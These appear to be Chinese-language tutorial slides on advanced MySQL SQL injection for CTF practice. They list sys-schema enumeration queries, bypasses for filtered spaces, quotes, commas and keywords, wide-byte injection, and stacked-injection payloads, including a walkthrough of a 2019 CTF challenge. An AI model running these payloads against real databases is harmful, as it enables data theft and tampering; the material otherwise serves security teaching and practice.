# SQL注入进阶

## MySQL 5.7特性
MySQL 5.7.9新增`sys`数据库

```sql
SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_table_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`x$io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();
SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();
```

## MySQL 8 特性
MySQL 8.0.19之后，新增了`TABLE`、`VALUES`

- TABLE语法 - 始终显示所有字段、不支持过滤，即WHERE子句
```sql
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
```

- VALUE语法 - 把一组一个或多个行作为表展示出来，返回的也是一个表数据
```sql
VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]

VALUES ROW(1, 2, 3) UNION SELECT * FROM users;
```

## 编码绕过

- to_base64，5.6版本新增
- hex
- aes_encrypt
- des_encrypt

## 过滤空格

<div grid="~ cols-2 gap-4">
<div>

- 注释
    - /**/
    - /\*something\*/
    - /\*!\*/
- 括号 - `UNION(SELECT(column)FROM(tbl))`

</div>
<div>

- 其他字符

| | |
| ---------|----------|
 09 | Horizontal Tab |
 0A | New Line |
 0B | Vertical Tab |
 0C | New Page |
 0D | Carriage Return |
 A0 | Non-breaking Space |
 20 | Space |

</div>
</div>

## 过滤引号

- 十六进制
```sql
SELECT * FROM users WHERE username = 0x637466;
```
> - [由Three Hit聊聊二次注入](https://www.freebuf.com/articles/web/167089.html)
- `char()`函数
```sql
SELECT * FROM users WHERE username = CHAR(99, 116, 102);
```

## 过滤逗号

- 联表查询`JOIN`
```sql
-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```
- `LIMIT 1 OFFSET 0`
- `FROM x FOR y`
    - mid(user() from 1 for 1)
    - substr(user() from 1 for 1)
- `EXP`等数学运算函数
> 前提是有报错信息

```sql
select !(select*from(select user())x)-~0;
```

## 过滤字段名
过滤字段或无法知道字段名，通常可以进行连表查询和按位比较

```sql
select x.3 from (select * from (select 1)a JOIN (select 2)b JOIN (select 3)c union(select * from users))x;
```

如果表中只有1个字段，`SUBSTR((SELECT * FROM users LIMIT 1),1,1)='x'`
如果有多个字段，需要字段数相等

```sql
SELECT (SELECT 1,2,3) > (SELECT * FROM users LMIT 1);
```

MySQL默认不区分大小写，可以使用二进制字符串进行比较
`SELECT CONCAT("A", CAST(0 AS JSON))`

## 过滤关键字

<div grid="~ cols-2 gap-4">
<div>

等价
- `AND`、`&&`
- `OR`、`||`
-  `=`、`LIKE`、`GREATEST()`,[更多比较操作符](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)

</div>
<div>

- `/union\s+select/i`
    - UNION(SELECT)
    - UNION [ALL|DISTINCT] SELECT
    - UNION/\*!SELECT\*/
    - UNION/**/SELECT
    - UNION%A0SELECT
- `/union/i`  - 转化为盲注
- `/select/i` - 往往和堆叠注入有联系
- `preg_replace('[\s]',"",$id))`  删除关键字
    - `SELESELECTCT`，叠字绕过

</div>
</div>

## 宽字节注入
在开启转义后，由于数据库编码和PHP编码不同，产生注入

- [addslashes](https://www.php.net/manual/zh/function.addslashes.php)为了数据库查询语句等的需要在某些字符前加上了反斜线转义，单引号（'）、双引号（"）、反斜线（\）与 NUL（null 字符）

0x <u>5c</u> -> `\`

$id = 0x <u>bf</u> <u>27</u>

addslashes($id)   -> 0x <u>bf 5c</u> 27  -> `縗'`

> GBK采用双字节编码，编码范围8140-FEFE

## 堆叠注入
存在堆叠注入，且过滤`select`

```sql
// 修改表名
RENAME TABLE `tbl_name` TO `new_tbl_name`;
ALTER TABLE `tbl_name` RENAME TO `new_tbl_name`;

// 修改字段名
ALTER TABLE `tbl_name` CHANGE `col_name` `new_col_name` 字段类型;
```

预编译语句
```sql
set @sql=concat("sel","ect flag from `tbl_name`");
PREPARE x from @sql;
EXECUTE x;
```

handler

```sql
```

## 练习题

- GYCTF2020 Ezsqli
- 网鼎杯 2018 unfinish

## 经典赛题分析

### 强网杯_2019_随便注

堆叠注入

1. 单引号、有错误信息提示、字段数为2
2. 过滤`preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
3. 过滤`select`，考虑堆叠注入

方法1:预编译

```sql
SET @sql=concat("se","lect flag from `1919810931114514`");PREPARE x FROM @sql;EXECUTE x;
```

方法2:修改表名、字段名

```sql
RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100);
```

方法3:`handler`，见

```sql

```

> i春秋2020新春公益赛第二天blacklist，采用第三种方法


<!-OOB,oeder by 注入，false注入，like注入 mysql特性-->